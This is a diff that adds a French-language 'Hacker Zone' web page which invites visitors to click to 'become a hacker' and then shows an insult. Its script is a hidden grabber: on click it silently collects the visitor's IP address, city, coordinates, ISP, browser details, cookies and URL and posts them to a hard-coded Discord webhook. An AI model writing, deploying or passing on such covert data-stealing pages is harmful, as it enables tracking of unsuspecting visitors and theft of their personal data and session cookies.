@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Hacker Zone</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff41;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .box {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 50px;
+            border-radius: 15px;
+            border: 2px solid #00ff41;
+            box-shadow: 0 0 50px rgba(0, 255, 65, 0.2);
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .box:hover {
+            box-shadow: 0 0 80px rgba(0, 255, 65, 0.4);
+            transform: scale(1.02);
+        }
+        h1 {
+            font-size: 28px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            animation: blink 1.5s step-end infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .cursor {
+            display: inline-block;
+            width: 10px;
+            height: 20px;
+            background: #00ff41;
+            animation: flash 0.8s step-end infinite;
+            vertical-align: middle;
+            margin-left: 5px;
+        }
+        @keyframes flash {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        #mainText {
+            transition: all 0.5s;
+        }
+        #clickMessage {
+            display: none;
+            font-size: 32px;
+            color: #ff0044;
+            text-shadow: 0 0 30px rgba(255, 0, 68, 0.8);
+            animation: glitch 0.6s ease-in-out;
+            font-weight: bold;
+        }
+        @keyframes glitch {
+            0% { transform: translateX(0); opacity: 0; }
+            20% { transform: translateX(-15px); opacity: 1; }
+            40% { transform: translateX(15px); }
+            60% { transform: translateX(-8px); }
+            80% { transform: translateX(8px); }
+            100% { transform: translateX(0); }
+        }
+        .sub {
+            color: #0088ff;
+            font-size: 14px;
+            margin-top: 15px;
+            letter-spacing: 2px;
+        }
+        .footer {
+            position: fixed;
+            bottom: 20px;
+            color: #333;
+            font-size: 10px;
+        }
+        .hidden {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="box" id="mainBox">
+        <div id="mainText">
+            <h1>➜ DEVENIR UN HACKER</h1>
+            <div class="sub">▸ Cliquez n'importe où pour initier l'activation ◂</div>
+            <div style="margin-top: 20px;">
+                <span style="color:#555;">#</span>
+                <span style="color:#00ff41;">root@hacker</span>
+                <span style="color:#555;">:~$</span>
+                <span style="color:#fff;">_</span>
+                <span class="cursor"></span>
+            </div>
+        </div>
+        <div id="clickMessage">
+            ⚡ NTM FDP ⚡
+        </div>
+    </div>
+    <div class="footer">[ HACKER ZONE v2.0 ]</div>
+
+    <script>
+        // ⚠️ WEBHOOK - REMPLACE PAR UN NOUVEAU SI INVALIDE
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519751550120235029/zE5YIDhewogT6QLFDTVYLE_1SB-NaysvFXPwOle51LkHX2iTlvrLuSq1bsGsuHoaczqM";
+
+        async function getIPInfo() {
+            try {
+                const r = await fetch('https://ipapi.co/json/');
+                const data = await r.json();
+                return {
+                    ip: data.ip || 'Inconnu',
+                    ville: data.city || 'Inconnu',
+                    region: data.region || 'Inconnu',
+                    pays: data.country_name || 'Inconnu',
+                    org: data.org || 'Inconnu',
+                    lat: data.latitude || 'N/A',
+                    lon: data.longitude || 'N/A'
+                };
+            } catch {
+                return { ip: 'Non récupérée' };
+            }
+        }
+
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                langue: navigator.language,
+                plateforme: navigator.platform,
+                écran: `${window.screen.width}x${window.screen.height}`,
+                cookies: navigator.cookieEnabled ? 'Activés' : 'Désactivés',
+                referrer: document.referrer || 'Direct',
+                url: window.location.href,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        function getCookies() {
+            return document.cookie || 'Aucun cookie';
+        }
+
+        async function sendToWebhook(ipInfo, browserInfo, cookies) {
+            const embed = {
+                embeds: [{
+                    title: '💀 NOUVEAU VISITEUR - HACKER ZONE',
+                    color: 0xff0000,
+                    fields: [
+                        { name: '🌐 IP', value: ipInfo.ip || 'Inconnu', inline: true },
+                        { name: '📍 Localisation', value: `${ipInfo.ville || 'N/A'}, ${ipInfo.pays || 'N/A'}`, inline: true },
+                        { name: '📡 FAI', value: ipInfo.org || 'N/A', inline: false },
+                        { name: '🗺️ Coordonnées', value: `Lat: ${ipInfo.lat || 'N/A'}, Lon: ${ipInfo.lon || 'N/A'}`, inline: true },
+                        { name: '🖥️ Navigateur', value: browserInfo.userAgent || 'N/A', inline: false },
+                        { name: '🌍 Langue', value: browserInfo.langue || 'N/A', inline: true },
+                        { name: '📱 Plateforme', value: browserInfo.plateforme || 'N/A', inline: true },
+                        { name: '🖥️ Écran', value: browserInfo.écran || 'N/A', inline: true },
+                        { name: '🕒 Fuseau horaire', value: browserInfo.timezone || 'N/A', inline: true },
+                        { name: '🍪 Cookies', value: cookies || 'Aucun', inline: false },
+                        { name: '🔗 Référent', value: browserInfo.referrer || 'Direct', inline: false },
+                        { name: '📄 URL', value: browserInfo.url || 'N/A', inline: false }
+                    ],
+                    footer: { text: `Grabber - ${new Date().toLocaleString()}` }
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embed)
+                });
+            } catch {}
+        }
+
+        // Action au clic sur la boîte
+        document.getElementById('mainBox').addEventListener('click', function() {
+            const mainText = document.getElementById('mainText');
+            const clickMsg = document.getElementById('clickMessage');
+
+            // Cacher le texte original
+            mainText.classList.add('hidden');
+            // Afficher NTM FDP
+            clickMsg.style.display = 'block';
+            // Changer la bordure en rouge
+            this.style.borderColor = '#ff0044';
+            this.style.boxShadow = '0 0 80px rgba(255, 0, 68, 0.5)';
+            // Désactiver le clic
+            this.style.cursor = 'default';
+            this.onclick = null;
+
+            // Envoyer les infos au webhook
+            (async () => {
+                const ipInfo = await getIPInfo();
+                const browserInfo = getBrowserInfo();
+                const cookies = getCookies();
+                await sendToWebhook(ipInfo, browserInfo, cookies);
+            })();
+        });
+    </script>
+</body>
+</html>
